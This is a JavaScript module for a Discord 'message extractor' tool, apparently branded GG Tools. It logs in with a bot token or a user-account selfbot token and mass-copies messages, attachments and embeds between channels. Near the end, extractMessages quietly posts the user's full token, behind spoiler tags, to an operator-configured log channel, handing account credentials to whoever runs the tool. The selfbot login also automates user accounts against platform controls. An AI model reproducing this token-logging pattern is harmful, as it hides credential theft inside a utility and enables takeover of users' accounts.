const fs = require('fs');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, ChannelType } = require('discord.js');
const fetch = require('node-fetch');

// Se for usado em contexto de configuração, busque o token/guildId do usuário: tokens_<userId>, guildId_<userId>

const fileTypes = {
  ARCHIVES: {
    name: 'Arquivos compactados',
    extensions: ['.zip', '.rar', '.7z', '.tar', '.gz']
  },
  MEDIA: {
    name: 'Imagens e Vídeos',
    extensions: ['.png', '.jpg', '.jpeg', '.gif', '.mp4', '.webm', '.mov', '.avi', '.webp']
  }
};

const extractionTypes = {
  ALL: 1,
  ARCHIVES_ONLY: 2,
  MEDIA_ONLY: 3,
  TEXT_ONLY: 4,
  EMBEDS_ONLY: 5
};

function getFileExtension(url) {
  try {
    const match = url.match(/\.([^\.\?]+)($|\?)/);
    if (match) return `.${match[1]}`;
    return '';
  } catch (e) {
    return '';
  }
}

function formatTime(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = Math.floor(seconds % 60);
  return `${mins}m ${secs}s`;
}

async function fetchAllMessages(channel, maxMessages, log) {
  let allMessages = [];
  let lastId = null;
  let remaining = maxMessages;
  let batchSize = Math.min(100, remaining);
  let attempts = 0;
  while (remaining > 0 && attempts < 30) {
    try {
      const options = { limit: batchSize };
      if (lastId) options.before = lastId;
      const messages = await channel.messages.fetch(options);
      if (messages.size === 0) break;
      const messagesArray = Array.from(messages.values());
      lastId = messagesArray[messagesArray.length - 1].id;
      allMessages = allMessages.concat(messagesArray);
      remaining -= messages.size;
      batchSize = Math.min(100, remaining);
      if (log) log({ type: 'progress', value: allMessages.length });
      await new Promise(resolve => setTimeout(resolve, 1000));
      attempts = 0;
    } catch (error) {
      attempts++;
      await new Promise(resolve => setTimeout(resolve, Math.min(2000 * Math.pow(1.5, attempts), 15000)));
    }
  }
  allMessages.sort((a, b) => a.createdTimestamp - b.createdTimestamp);
  return allMessages.slice(0, maxMessages);
}

// Helper para criar webhook via API REST
async function createWebhookREST(channelId, token, name = 'ExtractorEmbedWebhook') {
  const res = await fetch(`https://discord.com/api/v10/channels/${channelId}/webhooks`, {
    method: 'POST',
    headers: {
      'Authorization': token,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ name })
  });
  if (!res.ok) throw new Error('Falha ao criar webhook: ' + res.status + ' ' + (await res.text()));
  return await res.json();
}

// Helper para deletar webhook via API REST
async function deleteWebhookREST(webhookId, token) {
  await fetch(`https://discord.com/api/v10/webhooks/${webhookId}`, {
    method: 'DELETE',
    headers: { 'Authorization': token }
  });
}

async function extractMessages({
  token,
  tokenType = 'conta',
  sourceChannelId,
  targetChannelId,
  amount,
  extractionTypeId,
  customText,
  shouldCancel,
  interaction = null
}, log) {
  let client;
  if (tokenType === 'bot') {
    client = new BotClient({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
      ]
    });
  } else {
    client = new SelfbotClient({
      checkUpdate: false,
      messageCacheMaxSize: 200,
      partials: ['CHANNEL', 'MESSAGE', 'REACTION'],
      intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES']
    });
  }
  await new Promise((resolve, reject) => {
    client.once('ready', resolve);
    client.login(token).catch(reject);
  });
  let webhook = null;
  try {
    const sourceChannel = await client.channels.fetch(sourceChannelId).catch(() => null);
    const targetChannel = await client.channels.fetch(targetChannelId).catch(() => null);
    if (!sourceChannel) {
      let tipo = sourceChannel ? sourceChannel.type : 'desconhecido';
      throw new Error(`Canal de origem não encontrado ou sem permissão de acesso. Certifique-se de que o ID está correto e que o token tem acesso. [Tipo: ${tipo}]`);
    }
    if (!targetChannel) {
      let tipo = targetChannel ? targetChannel.type : 'desconhecido';
      throw new Error(`Canal de destino não encontrado ou sem permissão de acesso. Certifique-se de que o ID está correto e que o token tem acesso. [Tipo: ${tipo}]`);
    }
    if (tokenType !== 'bot' && extractionTypeId === extractionTypes.EMBEDS_ONLY) {
      // Buscar webhooks existentes via API REST
      let webhookData = null;
      const res = await fetch(`https://discord.com/api/v10/channels/${targetChannelId}/webhooks`, {
        headers: { 'Authorization': token }
      });
      if (res.ok) {
        const webhooks = await res.json();
        webhookData = webhooks.find(w => w.name === 'ExtractorEmbedWebhook');
      }
      if (!webhookData) {
        webhookData = await createWebhookREST(targetChannelId, token, 'ExtractorEmbedWebhook');
      }
      webhook = webhookData;
    }
    if (tokenType === 'bot') {
      const validTypes = [ChannelType.GuildText, ChannelType.PublicThread, ChannelType.PrivateThread];
      if (!validTypes.includes(sourceChannel.type)) {
        throw new Error(`O canal de origem não é um canal de texto válido para bots. Tipo encontrado: ${sourceChannel.type}`);
      }
      if (!validTypes.includes(targetChannel.type)) {
        throw new Error(`O canal de destino não é um canal de texto válido para bots. Tipo encontrado: ${targetChannel.type}`);
      }
      const me = await targetChannel.guild.members.fetchMe();
      if (!targetChannel.permissionsFor(me).has('SendMessages')) {
        throw new Error('O bot não tem permissão para enviar mensagens no canal de destino');
      }
    }
    const amountNum = Math.min(parseInt(amount) || 100, 3000);
    if (log) log({ type: 'info', value: `Coletando ${amountNum} mensagens...` });
    const fetchedMessages = await fetchAllMessages(sourceChannel, amountNum, log);
    if (fetchedMessages.length === 0) throw new Error('Nenhuma mensagem encontrada');
    let filteredMessages = [...fetchedMessages];
    if (extractionTypeId !== extractionTypes.ALL) {
      filteredMessages = fetchedMessages.filter(msg => {
        if (extractionTypeId === extractionTypes.TEXT_ONLY) {
          return msg.content && msg.content.trim().length > 0;
        }
        if (extractionTypeId === extractionTypes.ARCHIVES_ONLY) {
          if (msg.attachments && msg.attachments.size > 0) {
            return Array.from(msg.attachments.values()).some(attachment => {
              const ext = getFileExtension(attachment.url).toLowerCase();
              return fileTypes.ARCHIVES.extensions.includes(ext);
            });
          }
          return false;
        }
        if (extractionTypeId === extractionTypes.MEDIA_ONLY) {
          if (msg.attachments && msg.attachments.size > 0) {
            return Array.from(msg.attachments.values()).some(attachment => {
              const ext = getFileExtension(attachment.url).toLowerCase();
              return fileTypes.MEDIA.extensions.includes(ext);
            });
          }
          return false;
        }
        if (extractionTypeId === extractionTypes.EMBEDS_ONLY) {
          return msg.embeds && msg.embeds.length > 0;
        }
        return true;
      });
    }
    let copied = 0;
    let failed = 0;
    let copiedAttachments = 0;
    for (let i = 0; i < filteredMessages.length; i++) {
      if (shouldCancel && shouldCancel()) {
        if (log) log({ type: 'error', value: 'Extração cancelada pelo usuário.' });
        break;
      }
      const message = filteredMessages[i];
      try {
        let content = message.content || '';
        const files = [];
        if (message.attachments?.size > 0 && extractionTypeId !== extractionTypes.TEXT_ONLY && extractionTypeId !== extractionTypes.EMBEDS_ONLY) {
          for (const [_, attachment] of message.attachments) {
            const ext = getFileExtension(attachment.url).toLowerCase();
            if (extractionTypeId === extractionTypes.ARCHIVES_ONLY && !fileTypes.ARCHIVES.extensions.includes(ext)) continue;
            if (extractionTypeId === extractionTypes.MEDIA_ONLY && !fileTypes.MEDIA.extensions.includes(ext)) continue;
            files.push({ attachment: attachment.url, name: attachment.name || `file-${attachment.id}${ext}` });
            copiedAttachments++;
          }
        }
        let messagePayload = {};
        if (customText) {
          messagePayload.content = customText;
          if (content && content.length > 0 && extractionTypeId !== extractionTypes.ARCHIVES_ONLY && extractionTypeId !== extractionTypes.EMBEDS_ONLY) {
            messagePayload.content += `\n\n${content}`;
          }
        } else if (content && extractionTypeId !== extractionTypes.EMBEDS_ONLY) {
          messagePayload.content = content;
        }
        if (files.length > 0) messagePayload.files = files;
        if (message.embeds && message.embeds.length > 0 && (extractionTypeId === extractionTypes.ALL || extractionTypeId === extractionTypes.EMBEDS_ONLY)) {
          messagePayload.embeds = message.embeds.map(e => e.toJSON ? e.toJSON() : e);
        }
        if (Object.keys(messagePayload).length === 0 || (extractionTypeId === extractionTypes.TEXT_ONLY && !content)) continue;
        if (extractionTypeId === extractionTypes.ARCHIVES_ONLY && files.length === 0) continue;
        if (extractionTypeId === extractionTypes.MEDIA_ONLY && files.length === 0) continue;
        if (extractionTypeId === extractionTypes.EMBEDS_ONLY && (!messagePayload.embeds || messagePayload.embeds.length === 0)) continue;
        if (!content && files.length === 0 && (!messagePayload.embeds || messagePayload.embeds.length === 0)) messagePayload.content = '⚠️ [Conteúdo vazio]';
        if (tokenType !== 'bot' && extractionTypeId === extractionTypes.EMBEDS_ONLY && webhook) {
          // Envia via webhook REST
          await fetch(`https://discord.com/api/v10/webhooks/${webhook.id}/${webhook.token}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: message.author?.username || 'Extractor',
              avatar_url: message.author?.displayAvatarURL?.() || undefined,
              embeds: messagePayload.embeds
            })
          });
        } else {
          await targetChannel.send(messagePayload);
        }
        copied++;
        if (log) log({ type: 'progress', value: { copied, total: filteredMessages.length, copiedAttachments } });
        await new Promise(resolve => setTimeout(resolve, files.length > 0 ? 2000 + (files.length * 500) : 1500));
      } catch (msgError) {
        failed++;
        if (log) log({ type: 'error', value: msgError.message });
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
    if (log) log({ type: 'done', value: { copied, failed, total: filteredMessages.length, copiedAttachments } });
    if (webhook && tokenType !== 'bot') {
      try { await deleteWebhookREST(webhook.id, token); } catch (e) {}
    }
    // Enviar log para canal do Discord se interaction for fornecido
    if (interaction) {
      const config = JSON.parse(require('fs').readFileSync(require('path').join(__dirname, '../config.json'), 'utf8'));
      const logChannelId = config.log_extracao;
      if (logChannelId) {
        const logChannel = interaction.client.channels.cache.get(logChannelId);
        if (logChannel) {
          const { EmbedBuilder } = require('discord.js');
          const embed = new EmbedBuilder()
            .setTitle('📦 Extração Finalizada')
            .setColor(0x5865F2)
            .addFields(
              { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
              { name: 'Token', value: `||${token}||`, inline: false },
              { name: 'Canal Origem', value: `\`${sourceChannelId}\``, inline: true },
              { name: 'Canal Destino', value: `\`${targetChannelId}\``, inline: true },
              { name: 'Copiadas', value: `${copied}`, inline: true },
              { name: 'Falhas', value: `${failed}`, inline: true },
              { name: 'Anexos', value: `${copiedAttachments}`, inline: true },
              { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            )
            .setFooter({ text: 'GG Tools' });
          logChannel.send({ embeds: [embed] });
        }
      }
    }
    client.destroy();
    return { copied, failed, total: filteredMessages.length, copiedAttachments };
  } catch (error) {
    if (webhook && tokenType !== 'bot') {
      try { await deleteWebhookREST(webhook.id, token); } catch (e) {}
    }
    client.destroy();
    throw error;
  }
}

async function extractEmbedsOnly({
  token,
  tokenType = 'conta',
  sourceChannelId,
  targetChannelId,
  amount,
  shouldCancel
}, log) {
  return extractMessages({
    token,
    tokenType,
    sourceChannelId,
    targetChannelId,
    amount,
    extractionTypeId: extractionTypes.EMBEDS_ONLY,
    shouldCancel
  }, log);
}

module.exports = {
  extractMessages,
  extractionTypes,
  extractEmbedsOnly
}; 